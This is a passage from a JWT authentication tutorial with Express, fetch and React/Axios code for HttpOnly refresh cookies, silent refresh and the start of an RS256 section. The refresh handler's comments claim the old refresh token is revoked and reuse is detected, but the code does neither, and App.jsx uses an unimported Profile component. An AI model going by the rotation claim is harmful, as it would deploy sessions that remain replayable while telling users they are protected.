        <div class="step"><div class="step-n">4</div><div class="step-body"><strong>Page refresh:</strong> accessToken variable is gone. Frontend automatically calls <code>POST /auth/refresh</code>. Browser sends the HttpOnly cookie automatically. Server returns new access token.</div></div>
        <div class="step"><div class="step-n">5</div><div class="step-body"><strong>Access token expires:</strong> Server returns 401. Frontend calls /auth/refresh automatically. Gets new access token. Retries original request. User sees nothing.</div></div>
        <div class="step"><div class="step-n">6</div><div class="step-body"><strong>Logout:</strong> Frontend calls <code>POST /auth/logout</code>. Server clears the cookie. Frontend clears the in-memory variable.</div></div>
      </div>
      <hr class="divider">
      <h2>Backend — complete implementation</h2>
      <h3>Cookie options explained</h3>
      <div class="file-tag">src/config/cookieOptions.js</div>
      <pre><code class="language-javascript">// These options are used every time we set the refresh token cookie
const REFRESH_COOKIE_OPTIONS = {
  httpOnly: true,
  // httpOnly: true means:
  // - The cookie will NOT appear in document.cookie (JavaScript can't see it)
  // - It IS sent in HTTP requests automatically by the browser
  // - XSS attacks cannot steal it because JS has zero visibility into it
  
  secure: process.env.NODE_ENV === 'production',
  // secure: true means:
  // - Cookie ONLY sent over HTTPS, never plain HTTP
  // - In development (NODE_ENV=development), set to false so localhost works
  // - In production, always set to true
  
  sameSite: 'strict',
  // sameSite: 'strict' means:
  // - Cookie ONLY sent when request originates from your OWN site
  // - If user is on attacker.com and a form submits to your API,
  //   the browser will NOT include this cookie
  // - This protects against CSRF (Cross-Site Request Forgery) attacks
  // - Use 'lax' if you need to support OAuth redirects from other sites
  
  maxAge: 7 * 24 * 60 * 60 * 1000,
  // maxAge is in MILLISECONDS
  // 7 days * 24 hours * 60 minutes * 60 seconds * 1000 ms
  // Cookie expires from browser after 7 days
  
  path: '/api/auth'
  // path: '/api/auth' means:
  // - Cookie is ONLY sent to URLs starting with /api/auth
  // - Won't be sent to /api/profile or /api/users
  // - Reduces exposure — only the auth service can use this cookie
};

module.exports = REFRESH_COOKIE_OPTIONS;</code></pre>
      <h3>Complete authentication controller</h3>
      <div class="file-tag">src/controllers/authController.js</div>
      <pre><code class="language-javascript">const User        = require('../models/User');
const bcrypt      = require('bcryptjs');
const { generateAccessToken, generateRefreshToken, verifyRefreshToken }
                  = require('../utils/tokenUtils');
const COOKIE_OPTS = require('../config/cookieOptions');

// POST /api/auth/register
exports.register = async (req, res) => {
  try {
    const { name, email, password } = req.body;

    // Validation
    if (!name || !email || !password)
      return res.status(400).json({ error: 'All fields required' });
    if (password.length < 8)
      return res.status(400).json({ error: 'Password must be at least 8 characters' });

    // Check for existing user
    if (await User.findOne({ email: email.toLowerCase() }))
      return res.status(409).json({ error: 'Email already registered' });

    // Create user (password hashed in pre-save hook)
    const user = await User.create({
      name: name.trim(),
      email: email.toLowerCase(),
      passwordHash: password
    });

    // Generate BOTH tokens
    const accessToken  = generateAccessToken(user);
    const refreshToken = generateRefreshToken(user);

    // Set refresh token as HttpOnly cookie
    // The browser stores this cookie automatically
    // JavaScript on the frontend CANNOT read or access it
    res.cookie('refreshToken', refreshToken, COOKIE_OPTS);

    // Send access token in response body (frontend stores in memory)
    res.status(201).json({
      message:     'Account created',
      user:        { id: user._id, name: user.name, email: user.email, role: user.role },
      accessToken, // ← stored in JS memory by frontend
      expiresIn:   900 // 15 minutes in seconds
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Registration failed' });
  }
};

// POST /api/auth/login
exports.login = async (req, res) => {
  try {
    const { email, password } = req.body;
    const GENERIC_ERROR = 'Invalid email or password';

    if (!email || !password)
      return res.status(400).json({ error: GENERIC_ERROR });

    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user || !(await bcrypt.compare(password, user.passwordHash)))
      return res.status(401).json({ error: GENERIC_ERROR });

    if (!user.isActive)
      return res.status(403).json({ error: 'Account disabled. Contact support.' });

    const accessToken  = generateAccessToken(user);
    const refreshToken = generateRefreshToken(user);

    res.cookie('refreshToken', refreshToken, COOKIE_OPTS);

    res.json({
      message:     'Login successful',
      user:        { id: user._id, name: user.name, email: user.email, role: user.role },
      accessToken,
      expiresIn:   900
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Login failed' });
  }
};

// POST /api/auth/refresh
// Client sends this when access token expires or on page load
// The browser automatically includes the HttpOnly refresh token cookie
exports.refresh = async (req, res) => {
  try {
    // req.cookies.refreshToken is populated by cookie-parser middleware
    // The browser sent this cookie automatically — frontend code didn't touch it
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({
        error: 'No refresh token. Please log in.',
        code:  'NO_REFRESH_TOKEN'
      });
    }

    // Verify the refresh token
    let decoded;
    try {
      decoded = verifyRefreshToken(refreshToken);
    } catch (err) {
      // Refresh token is invalid or expired — force re-login
      res.clearCookie('refreshToken', COOKIE_OPTS);
      return res.status(403).json({
        error: 'Refresh token is invalid or expired. Please log in again.',
        code:  'REFRESH_TOKEN_INVALID'
      });
    }

    // Load user from database
    const user = await User.findById(decoded.sub);
    if (!user || !user.isActive) {
      res.clearCookie('refreshToken', COOKIE_OPTS);
      return res.status(403).json({ error: 'User not found or disabled' });
    }

    // Check tokenVersion — if user changed password or logged out of all devices,
    // tokenVersion was incremented, making all old refresh tokens invalid
    if (user.tokenVersion !== decoded.tokenVersion) {
      res.clearCookie('refreshToken', COOKIE_OPTS);
      return res.status(403).json({
        error: 'Session revoked. Please log in again.',
        code:  'TOKEN_REVOKED'
      });
    }

    // REFRESH TOKEN ROTATION:
    // Issue a BRAND NEW refresh token and revoke the old one
    // This means each refresh token can only be used ONCE
    // If an attacker steals a refresh token and uses it,
    // the original owner's next refresh will fail (token already used)
    // → Server can detect token reuse and invalidate the session
    const newAccessToken  = generateAccessToken(user);
    const newRefreshToken = generateRefreshToken(user);

    res.cookie('refreshToken', newRefreshToken, COOKIE_OPTS);
    res.json({
      accessToken: newAccessToken,
      expiresIn:   900
    });

  } catch (err) {
    console.error(err);
    res.clearCookie('refreshToken', COOKIE_OPTS);
    res.status(500).json({ error: 'Token refresh failed' });
  }
};

// POST /api/auth/logout
exports.logout = (req, res) => {
  // Clear the HttpOnly cookie from the browser
  res.clearCookie('refreshToken', {
    ...COOKIE_OPTS,
    maxAge: 0 // expire immediately
  });

  // The in-memory access token will be cleared by the frontend
  // It expires on its own in 15 minutes regardless

  res.json({ message: 'Logged out successfully' });
};

// POST /api/auth/logout-all
// Logs the user out from ALL devices by invalidating ALL refresh tokens
exports.logoutAll = async (req, res) => {
  try {
    // Increment tokenVersion — all existing refresh tokens have the OLD version
    // and will be rejected on the next refresh attempt
    await User.findByIdAndUpdate(req.user.sub, {
      $inc: { tokenVersion: 1 }
    });

    res.clearCookie('refreshToken', { ...COOKIE_OPTS, maxAge: 0 });

    res.json({
      message: 'Logged out from all devices. All sessions invalidated.'
    });

  } catch (err) {
    res.status(500).json({ error: 'Logout failed' });
  }
};</code></pre>
      <hr class="divider">
      <h2>Frontend — silent refresh + auto-retry</h2>
      <div class="file-tag">frontend/auth.js — Method 2 complete</div>
      <pre><code class="language-javascript">'use strict';

const API = 'http://localhost:5000/api';

// ─────────────────────────────────────────────────────────
// IN-MEMORY STATE — NOT localStorage!
// ─────────────────────────────────────────────────────────
let accessToken  = null; // JWT access token in memory
let currentUser  = null; // user object in memory  
let refreshTimer = null; // timer reference for auto-refresh

// ─────────────────────────────────────────────────────────
// SILENT TOKEN REFRESH
// ─────────────────────────────────────────────────────────

async function refreshAccessToken() {
  try {
    const res = await fetch(\`\${API}/auth/refresh\`, {
      method:      'POST',
      credentials: 'include'
      // credentials: 'include' tells fetch to send cookies
      // The browser will automatically include the HttpOnly refreshToken cookie
      // even though JavaScript cannot read it
    });

    if (!res.ok) {
      // Refresh failed (cookie expired or revoked) — user must re-login
      handleSessionExpired();
      return null;
    }

    const data   = await res.json();
    accessToken  = data.accessToken;

    // Schedule next silent refresh 1 minute before expiry
    scheduleRefresh(data.expiresIn);

    return accessToken;

  } catch (err) {
    console.error('Refresh error:', err);
    return null;
  }
}

function scheduleRefresh(expiresInSeconds) {
  // Clear any existing timer
  if (refreshTimer) clearTimeout(refreshTimer);

  // Schedule refresh 60 seconds before expiry
  // If token expires in 900s (15min), refresh at 840s (14min)
  const refreshIn = (expiresInSeconds - 60) * 1000;

  if (refreshIn > 0) {
    refreshTimer = setTimeout(() => {
      console.log('Silently refreshing access token...');
      refreshAccessToken();
    }, refreshIn);
  }
}

function handleSessionExpired() {
  accessToken = null;
  currentUser = null;
  if (refreshTimer) clearTimeout(refreshTimer);
  window.location.href = '/login.html';
}

// ─────────────────────────────────────────────────────────
// AUTH FUNCTIONS
// ─────────────────────────────────────────────────────────

async function register(name, email, password) {
  const res  = await fetch(\`\${API}/auth/register\`, {
    method:      'POST',
    headers:     { 'Content-Type': 'application/json' },
    credentials: 'include', // important: receive the HttpOnly cookie in response
    body:        JSON.stringify({ name, email, password })
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error);

  // Store access token in memory, schedule refresh
  accessToken = data.accessToken;
  currentUser = data.user;
  scheduleRefresh(data.expiresIn);
  return data;
}

async function login(email, password) {
  const res  = await fetch(\`\${API}/auth/login\`, {
    method:      'POST',
    headers:     { 'Content-Type': 'application/json' },
    credentials: 'include', // important: receive the HttpOnly cookie in response
    body:        JSON.stringify({ email, password })
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error);

  accessToken = data.accessToken;
  currentUser = data.user;
  scheduleRefresh(data.expiresIn);
  return data;
}

async function logout() {
  if (refreshTimer) clearTimeout(refreshTimer);

  // Tell server to clear the HttpOnly cookie
  await fetch(\`\${API}/auth/logout\`, {
    method:      'POST',
    credentials: 'include' // important: browser will send cookie so server can clear it
  }).catch(() => {}); // ignore errors

  // Clear in-memory state
  accessToken = null;
  currentUser = null;

  window.location.href = '/login.html';
}

// ─────────────────────────────────────────────────────────
// PAGE LOAD — silently restore session
// ─────────────────────────────────────────────────────────

// Call this on EVERY page load
// If the HttpOnly refresh token cookie exists and is valid,
// this will silently get a new access token and the user
// appears to "still be logged in" even after refreshing the page
async function initAuth() {
  const token = await refreshAccessToken();
  if (token) {
    // Optionally fetch user profile to populate currentUser
    try {
      const res = await fetch(\`\${API}/auth/me\`, {
        headers: { 'Authorization': \`Bearer \${token}\` }
      });
      if (res.ok) {
        const data = await res.json();
        currentUser = data.user;
      }
    } catch (err) {}
  }
  return token;
}

// ─────────────────────────────────────────────────────────
// AUTHENTICATED API REQUESTS
// ─────────────────────────────────────────────────────────

async function apiRequest(endpoint, options = {}) {
  // If no access token in memory, try to get one via refresh
  if (!accessToken) {
    const token = await refreshAccessToken();
    if (!token) return null; // user was redirected to login
  }

  // Make the request with the access token
  const res = await fetch(\`\${API}\${endpoint}\`, {
    ...options,
    headers: {
      'Content-Type':  'application/json',
      'Authorization': \`Bearer \${accessToken}\`,
      ...(options.headers || {})
    },
    credentials: 'include'
  });

  // If 401 — try refreshing ONCE and retrying
  if (res.status === 401) {
    const newToken = await refreshAccessToken();
    if (!newToken) return null; // redirected to login

    // Retry the original request with the new token
    const retryRes = await fetch(\`\${API}\${endpoint}\`, {
      ...options,
      headers: {
        'Content-Type':  'application/json',
        'Authorization': \`Bearer \${newToken}\`,
        ...(options.headers || {})
      },
      credentials: 'include'
    });

    const retryData = await retryRes.json();
    if (!retryRes.ok) throw new Error(retryData.error);
    return retryData;
  }

  const data = await res.json();
  if (!res.ok) throw new Error(data.error);
  return data;
}

// Convenience API object
const api = {
  get:    (url)       => apiRequest(url, { method: 'GET' }),
  post:   (url, body) => apiRequest(url, { method: 'POST',   body: JSON.stringify(body) }),
  put:    (url, body) => apiRequest(url, { method: 'PUT',    body: JSON.stringify(body) }),
  patch:  (url, body) => apiRequest(url, { method: 'PATCH',  body: JSON.stringify(body) }),
  delete: (url)       => apiRequest(url, { method: 'DELETE' })
};

// Initialize on page load
initAuth().then((token) => {
  if (token) {
    console.log('Session restored successfully');
  } else {
    console.log('No active session');
  }
});</code></pre>
    `
  },
  // Chapter 5: Method 3 — React + Axios
  {
    id: "method3",
    group: "Implementation Methods",
    label: "Method 3 — React + Axios",
    quiz: {
      q: "In your React app, 5 API requests are made simultaneously, and all of them get a 401 (token expired). Without proper queue handling, what problem occurs?",
      opts: [
        "All 5 requests fail permanently",
        "All 5 requests trigger /auth/refresh simultaneously — you end up with 5 concurrent refresh calls, causing race conditions and multiple cookie rotations",
        "Only the first request is retried",
        "The browser rate-limits the refresh calls automatically"
      ],
      ans: 1,
      exp: "Without a queue/mutex, multiple simultaneous 401s cause multiple concurrent refresh calls. Each refresh call rotates the cookie, so the later ones fail because the earlier one already rotated the cookie. The solution is a queue that holds pending requests while ONE refresh runs, then replays them all with the new token."
    },
    content: `
      <h2>Method 3 — React SPA with Axios Interceptors</h2>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — Post office sorting machine</div>
        <p>Every letter that goes through a post office passes through a sorting machine. The machine reads the address, adds required postage, and routes it correctly — automatically, for every letter, without the sender having to think about it.</p>
        <p>Axios interceptors are your sorting machine. Every request that goes through Axios automatically gets the Authorization header added (request interceptor) and every response is checked for auth errors (response interceptor). You write the logic once, it works everywhere.</p>
      </div>
      <h2>Architecture</h2>
      <div class="g3">
        <div class="mini-card"><h4>AuthContext</h4><p>React Context that holds user + accessToken state. All components access auth via <code>useAuth()</code> hook.</p></div>
        <div class="mini-card"><h4>Axios instance</h4><p>Configured axios with base URL and withCredentials. Used for ALL API calls in the app.</p></div>
        <div class="mini-card"><h4>Request interceptor</h4><p>Runs BEFORE each request. Attaches <code>Authorization: Bearer token</code> automatically.</p></div>
        <div class="mini-card"><h4>Response interceptor</h4><p>Runs AFTER each response. If 401, silently refreshes the token and retries the original request.</p></div>
        <div class="mini-card"><h4>Refresh queue</h4><p>Prevents multiple simultaneous refresh calls. Queues pending requests while one refresh runs.</p></div>
        <div class="mini-card"><h4>ProtectedRoute</h4><p>React Router component that redirects to login if the user is not authenticated.</p></div>
      </div>
      <hr class="divider">
      <h2>Complete code — step by step</h2>
      <div class="file-tag">src/api/axios.js — base instance</div>
      <pre><code class="language-javascript">import axios from 'axios';

// Create a custom Axios instance instead of using axios directly
// This lets us set defaults that apply to every request
const api = axios.create({
  baseURL:         'http://localhost:5000/api',
  // baseURL: all requests like api.get('/profile')
  // will be sent to http://localhost:5000/api/profile

  withCredentials: true,
  // withCredentials: true is the Axios equivalent of credentials:'include' in fetch
  // It tells the browser: always send cookies, even on cross-origin requests
  // Required for the HttpOnly refresh token cookie to be sent/received

  timeout: 10000
  // timeout: abort request if it takes more than 10 seconds
});

export default api;</code></pre>
      <div class="file-tag">src/api/interceptors.js — the smart layer</div>
      <pre><code class="language-javascript">import api from './axios';

// ─────────────────────────────────────────────────────────
// REFRESH QUEUE — prevents multiple simultaneous refresh calls
// ─────────────────────────────────────────────────────────
let isRefreshing  = false; // is a refresh currently in progress?
let pendingQueue  = [];    // requests waiting for the new token

// processQueue resolves or rejects all queued requests
function processQueue(error, newToken = null) {
  pendingQueue.forEach(({ resolve, reject }) => {
    if (error) {
      reject(error); // refresh failed — fail all queued requests
    } else {
      resolve(newToken); // refresh succeeded — retry all queued requests
    }
  });
  pendingQueue = []; // clear the queue
}

// ─────────────────────────────────────────────────────────
// SETUP FUNCTION — call once from App.jsx with auth context
// ─────────────────────────────────────────────────────────
export function setupInterceptors(auth) {

  // ── REQUEST INTERCEPTOR ───────────────────────────────
  // Runs before EVERY request sent through this axios instance
  api.interceptors.request.use(
    (config) => {
      // If we have an access token in context, attach it
      if (auth.accessToken) {
        config.headers.Authorization = \`Bearer \${auth.accessToken}\`;
      }
      return config; // return modified config (request proceeds)
    },
    (error) => {
      // Request failed to even send (network error before dispatch)
      return Promise.reject(error);
    }
  );

  // ── RESPONSE INTERCEPTOR ──────────────────────────────
  // Runs after EVERY response received (success OR error)
  api.interceptors.response.use(
    // Success handler (2xx status codes)
    (response) => response, // pass through unchanged

    // Error handler (non-2xx status codes)
    async (error) => {
      const originalRequest = error.config;
      // error.config = the original axios request config

      // Only handle 401 (Unauthorized) errors
      // and only if we haven't already retried this request
      if (error.response?.status === 401 && !originalRequest._retry) {

        // If a refresh is already in progress, queue this request
        if (isRefreshing) {
          return new Promise((resolve, reject) => {
            // Add to queue — will be processed when refresh completes
            pendingQueue.push({ resolve, reject });
          }).then((newToken) => {
            // Refresh succeeded — update header and retry
            originalRequest.headers.Authorization = \`Bearer \${newToken}\`;
            return api(originalRequest);
          }).catch((err) => {
            return Promise.reject(err);
          });
        }

        // Mark this request as already retried to prevent infinite loops
        originalRequest._retry = true;
        isRefreshing = true;

        try {
          // Attempt to get a new access token
          // The HttpOnly cookie is sent automatically (withCredentials: true)
          const response = await api.post('/auth/refresh');
          const newToken = response.data.accessToken;

          // Update the token in React Context
          auth.setAccessToken(newToken);

          // Resolve all queued requests with the new token
          processQueue(null, newToken);

          // Retry the original request with the new token
          originalRequest.headers.Authorization = \`Bearer \${newToken}\`;
          return api(originalRequest);

        } catch (refreshError) {
          // Refresh failed — user needs to log in again
          processQueue(refreshError, null);

          // Clear auth state
          auth.setAccessToken(null);
          auth.setUser(null);

          // Redirect to login
          window.location.href = '/login';
          return Promise.reject(refreshError);

        } finally {
          isRefreshing = false; // always reset the flag
        }
      }

      // For all other errors, just pass them through
      return Promise.reject(error);
    }
  );
}</code></pre>
      <div class="file-tag">src/context/AuthContext.jsx — global auth state</div>
      <pre><code class="language-javascript">import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import api from '../api/axios';

// Create the context
const AuthContext = createContext(null);

// AuthProvider wraps your entire app and provides auth state to all children
export function AuthProvider({ children }) {
  const [accessToken,  setAccessToken]  = useState(null);
  const [user,         setUser]         = useState(null);
  const [loading,      setLoading]      = useState(true);
  // loading = true while we check if the user has an active session
  // This prevents the app from flashing the login page before
  // we know if the user is actually logged in

  // ── RESTORE SESSION ON APP STARTUP ───────────────────
  useEffect(() => {
    const tryRestore = async () => {
      try {
        // Try to get a new access token using the HttpOnly cookie
        // If the user was logged in before, this will succeed silently
        const res = await api.post('/auth/refresh');
        setAccessToken(res.data.accessToken);
        // Optionally load the user profile
        if (res.data.user) {
          setUser(res.data.user);
        }
      } catch {
        // No valid session — user needs to log in
        // This is normal for first-time visitors
      } finally {
        setLoading(false); // done checking
      }
    };

    tryRestore();
  }, []); // empty array = run once on mount

  // ── LOGIN ─────────────────────────────────────────────
  const login = useCallback(async (email, password) => {
    const res = await api.post('/auth/login', { email, password });
    // api.post includes withCredentials:true
    // so the browser will store the HttpOnly cookie from Set-Cookie header
    setAccessToken(res.data.accessToken);
    setUser(res.data.user);
    return res.data;
  }, []);

  // ── REGISTER ─────────────────────────────────────────
  const register = useCallback(async (name, email, password) => {
    const res = await api.post('/auth/register', { name, email, password });
    setAccessToken(res.data.accessToken);
    setUser(res.data.user);
    return res.data;
  }, []);

  // ── LOGOUT ───────────────────────────────────────────
  const logout = useCallback(async () => {
    try {
      await api.post('/auth/logout'); // clears the HttpOnly cookie on server
    } catch (err) {
      // Even if the server request fails, clear local state
      console.error('Logout request failed:', err);
    }
    setAccessToken(null);
    setUser(null);
  }, []);

  // ── LOGOUT FROM ALL DEVICES ──────────────────────────
  const logoutAll = useCallback(async () => {
    try {
      await api.post('/auth/logout-all');
    } catch (err) {
      console.error('Logout-all failed:', err);
    }
    setAccessToken(null);
    setUser(null);
  }, []);

  const value = {
    user,
    setUser,
    accessToken,
    setAccessToken,
    isAuthenticated: !!user && !!accessToken,
    loading,
    login,
    register,
    logout,
    logoutAll
  };

  return (
    &lt;AuthContext.Provider value={value}&gt;
      {children}
    &lt;/AuthContext.Provider&gt;
  );
}

// Custom hook for clean usage
// Instead of: const auth = useContext(AuthContext)
// Write:       const auth = useAuth()
export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be used inside AuthProvider');
  return context;
};</code></pre>
      <div class="file-tag">src/App.jsx — wiring it all together</div>
      <pre><code class="language-javascript">import React, { useEffect } from 'react';
import { BrowserRouter, Routes, Route, Navigate, Outlet } from 'react-router-dom';
import { AuthProvider, useAuth } from './context/AuthContext';
import { setupInterceptors } from './api/interceptors';
import LoginPage     from './pages/LoginPage';
import RegisterPage  from './pages/RegisterPage';
import Dashboard     from './pages/Dashboard';
import AdminPage     from './pages/AdminPage';
import LoadingSpinner from './components/LoadingSpinner';

// ── PROTECTED ROUTE ────────────────────────────────────
// Wraps routes that require authentication
// If not authenticated → redirect to /login
// If a specific role required and user doesn't have it → redirect to /unauthorized
function ProtectedRoute({ requiredRole } = {}) {
  const { isAuthenticated, user, loading } = useAuth();

  // While checking session, show loading screen (not login page)
  if (loading) return &lt;LoadingSpinner /&gt;;

  // Not authenticated — go to login
  if (!isAuthenticated) return &lt;Navigate to="/login" replace /&gt;;

  // Wrong role — go to unauthorized
  if (requiredRole && user?.role !== requiredRole)
    return &lt;Navigate to="/unauthorized" replace /&gt;;

  // All good — render child routes
  return &lt;Outlet /&gt;;
}

// ── INTERCEPTORS SETUP ────────────────────────────────
// This component exists just to call setupInterceptors
// with access to the auth context (which we can't access outside the provider)
function InterceptorSetup() {
  const auth = useAuth();

  useEffect(() => {
    setupInterceptors(auth);
    // Note: we return nothing — interceptors persist until the app unmounts
  }, [auth.accessToken]); // re-setup when token changes

  return null; // renders nothing
}

// ── ROOT APP ──────────────────────────────────────────
export default function App() {
  return (
    &lt;AuthProvider&gt;         {/* provides auth state to everything */}
      &lt;BrowserRouter&gt;     {/* provides routing */}
        &lt;InterceptorSetup /&gt;  {/* sets up axios interceptors */}
        &lt;Routes&gt;

          {/* Public routes — anyone can access */}
          &lt;Route path="/login"    element={&lt;LoginPage /&gt;} /&gt;
          &lt;Route path="/register" element={&lt;RegisterPage /&gt;} /&gt;

          {/* Protected routes — must be logged in */}
          &lt;Route element={&lt;ProtectedRoute /&gt;}&gt;
            &lt;Route path="/dashboard" element={&lt;Dashboard /&gt;} /&gt;
            &lt;Route path="/profile"   element={&lt;Profile /&gt;} /&gt;
          &lt;/Route&gt;

          {/* Admin-only routes */}
          &lt;Route element={&lt;ProtectedRoute requiredRole="admin" /&gt;}&gt;
            &lt;Route path="/admin" element={&lt;AdminPage /&gt;} /&gt;
          &lt;/Route&gt;

          &lt;Route path="/"            element={&lt;Navigate to="/dashboard" /&gt;} /&gt;
          &lt;Route path="/unauthorized" element={&lt;h1&gt;Access Denied&lt;/h1&gt;} /&gt;
        &lt;/Routes&gt;
      &lt;/BrowserRouter&gt;
    &lt;/AuthProvider&gt;
  );
}</code></pre>
      <div class="file-tag">src/pages/LoginPage.jsx — complete form</div>
      <pre><code class="language-javascript">import React, { useState } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';

export default function LoginPage() {
  const { login, isAuthenticated } = useAuth();
  const navigate = useNavigate();

  const [form,    setForm]    = useState({ email: '', password: '' });
  const [error,   setError]   = useState('');
  const [loading, setLoading] = useState(false);

  // If already logged in, redirect to dashboard
  if (isAuthenticated) navigate('/dashboard', { replace: true });

  function handleChange(e) {
    setForm(prev => ({ ...prev, [e.target.name]: e.target.value }));
    setError(''); // clear error when user types
  }

  async function handleSubmit(e) {
    e.preventDefault();
    if (loading) return;

    setError('');
    setLoading(true);

    try {
      await login(form.email, form.password);
      // login() updates the context — ProtectedRoute will now allow access
      navigate('/dashboard');

    } catch (err) {
      // err.response.data.error = server error message
      const message = err.response?.data?.error || 'Login failed. Please try again.';
      setError(message);

    } finally {
      setLoading(false);
    }
  }

  return (
    &lt;div className="auth-page"&gt;
      &lt;h1&gt;Sign in&lt;/h1&gt;

      &lt;form onSubmit={handleSubmit}&gt;
        &lt;div&gt;
          &lt;label&gt;Email&lt;/label&gt;
          &lt;input
            type="email"
            name="email"
            value={form.email}
            onChange={handleChange}
            required
            autoComplete="email"
            disabled={loading}
          /&gt;
        &lt;/div&gt;

        &lt;div&gt;
          &lt;label&gt;Password&lt;/label&gt;
          &lt;input
            type="password"
            name="password"
            value={form.password}
            onChange={handleChange}
            required
            autoComplete="current-password"
            disabled={loading}
          /&gt;
        &lt;/div&gt;

        {error &amp;&amp; &lt;p className="error"&gt;{error}&lt;/p&gt;}

        &lt;button type="submit" disabled={loading}&gt;
          {loading ? 'Signing in...' : 'Sign in'}
        &lt;/button&gt;
      &lt;/form&gt;

      &lt;p&gt;Don't have an account? &lt;Link to="/register"&gt;Register&lt;/Link&gt;&lt;/p&gt;
    &lt;/div&gt;
  );
}</code></pre>
      <div class="file-tag">src/components/UserProfile.jsx — using auth in any component</div>
      <pre><code class="language-javascript">import React, { useEffect, useState } from 'react';
import { useAuth } from '../context/AuthContext';
import api from '../api/axios';

export default function UserProfile() {
  const { user, logout } = useAuth();
  // useAuth() gives us direct access to auth state
  // We do NOT need to pass props down through every component

  const [profileData, setProfileData] = useState(null);

  useEffect(() => {
    // api.get automatically attaches the Authorization header
    // because of our request interceptor
    // If the token expires, the response interceptor will refresh it
    // and retry this request — we don't have to think about it
    api.get('/profile')
      .then(res => setProfileData(res.data))
      .catch(err => console.error(err));
  }, []);

  return (
    &lt;div&gt;
      &lt;h2&gt;Welcome, {user?.name}&lt;/h2&gt;
      &lt;p&gt;Role: {user?.role}&lt;/p&gt;
      {profileData &amp;&amp; &lt;pre&gt;{JSON.stringify(profileData, null, 2)}&lt;/pre&gt;}
      &lt;button onClick={logout}&gt;Logout&lt;/button&gt;
    &lt;/div&gt;
  );
}</code></pre>
    `
  },
  // Chapter 6: Method 4 — RS256
  {
    id: "method4",
    group: "Implementation Methods",
    label: "Method 4 — RS256 (Microservices)",
    quiz: {
      q: "You have an auth service that issues RS256 JWTs. Your product service, order service, and notification service all need to verify these tokens. What does each service need?",
      opts: [
        "A copy of the private key",
        "Only the public key — it can verify but cannot create tokens",
        "Both keys — public for verify, private for sign",
        "The shared HMAC secret"
      ],
      ans: 1,
      exp: "The beauty of asymmetric RS256: only the auth service has the private key and can CREATE tokens. All other services only need the PUBLIC key, which can be shared freely. They can verify tokens but cannot create new ones. This is much safer than sharing an HMAC secret with every service."
    },
    content: `
      <h2>Method 4 — RS256 Asymmetric Keys (Microservices)</h2>
      <div class="real-life">
        <div class="real-life-title">Real-life analogy — Government passport</div>
        <p>A government issues your passport using their unique private tools (a private key). They stamp it with features that are extremely hard to fake. Any border agent in any country can inspect your passport and verify it's genuine — they don't need the government's private tools to verify, they just need to know what a genuine passport looks like (the public key / verification knowledge).</p>
        <p>The government = auth service (has private key, issues tokens). Border agents = product service, order service, etc. (have public key, can only verify). Your passport = the JWT.</p>
      </div>
      <h2>Why RS256 over HS256 for microservices</h2>
      <table class="comp-table">
        <tr><th>Feature</th><th>HS256 (symmetric)</th><th>RS256 (asymmetric)</th></tr>
        <tr><td>Keys</td><td>1 shared secret</td><td>Private key + Public key</td></tr>
        <tr><td>Signing</td><td>Anyone with the secret</td><td>Only holder of private key</td></tr>
        <tr><td>Verifying</td><td>Anyone with the secret</td><td>Anyone with the public key</td></tr>
        <tr><td>Secret sharing</td><td>Secret must be given to ALL services</td><td>Public key safe to share freely</td></tr>
        <tr><td>Risk of compromise</td><td>If any service is hacked, all tokens compromised</td><td>Only auth service can create tokens</td></tr>
        <tr><td>Performance</td><td>Very fast</td><td>Slower (RSA math is heavier)</td></tr>
        <tr><td>Best for</td><td>Single-service, monolith</td><td>Microservices, multi-service</td></tr>
      </table>
      <h2>Architecture diagram</h2>
      <div class="steps">
        <div class="step"><div class="step-n">1</div><div class="step-body"><strong>Auth Service</strong> has the private key. Creates and signs JWTs. Exposes <code>GET /.well-known/jwks.json</code> (public key endpoint)</div></div>
        <div class="step"><div class="step-n">2</div><div class="step-body"><strong>Other services</strong> (Product, Order, Notification) only have the public key. They can verify JWTs but CANNOT create them</div></div>
        <div class="step"><div class="step-n">3</div><div class="step-body"><strong>Client</strong> receives JWT from auth service, sends it to any other service in Authorization header</div></div>
        <div class="step"><div class="step-n">4</div><div class="step-body"><strong>Product service</strong> verifies the token using the public key (fetched from auth service's JWKS endpoint) — no database call needed</div></div>
      </div>
      <hr class="divider">
      <h3>Step 1 — Generate RSA key pair</h3>
      <pre><code class="language-javascript"># Generate RSA 2048-bit private key
openssl genrsa -out private.pem 2048

# Extract the public key from the private key
openssl rsa -in private.pem -pubout -out public.pem

# View private key (never share this file!)
cat private.pem
# -----BEGIN RSA PRIVATE KEY-----
# MIIEpAIBAAKCAQEA... (very long)
# -----END RSA PRIVATE KEY-----

# View public key (safe to share)
cat public.pem
# -----BEGIN PUBLIC KEY-----
# MIIBIjANBgkq... (shorter)
# -----END PUBLIC KEY-----

# In production: store these in environment variables
# node -e "
#   const fs = require('fs');
#   console.log(JSON.stringify(fs.readFileSync('private.pem','utf8')))
# "</code></pre>
      <div class="file-tag">src/utils/tokenUtils.js — RS256 version</div>
      <pre><code class="language-javascript">const jwt  = require('jsonwebtoken');
const fs   = require('fs');
const path = require('path');

// Load keys — in production, use environment variables or a secrets manager
// These are loaded once when the module is first imported
const PRIVATE_KEY = process.env.NODE_ENV === 'production'
  ? process.env.JWT_PRIVATE_KEY.replace(/\\n/g, '\n')
  // In env vars, newlines are escaped as \\n — replace them back
  : fs.readFileSync(path.resolve(__dirname, '../../private.pem'), 'utf8');

const PUBLIC_KEY = process.env.NODE_ENV === 'production'
  ? process.env.JWT_PUBLIC_KEY.replace(/\\n/g, '\n')
  : fs.readFileSync(path.resolve(__dirname, '../../public.pem'), 'utf8');

// Generate JWT signed with PRIVATE KEY
// Only the auth service calls this function
const generateAccessToken = (user) => {
  return jwt.sign(
    {
      sub:   user._id.toString(),
      email: user.email,
      role:  user.role,
      name:  user.name
    },
    PRIVATE_KEY,          // ← private key (asymmetric, not a shared secret)
    {
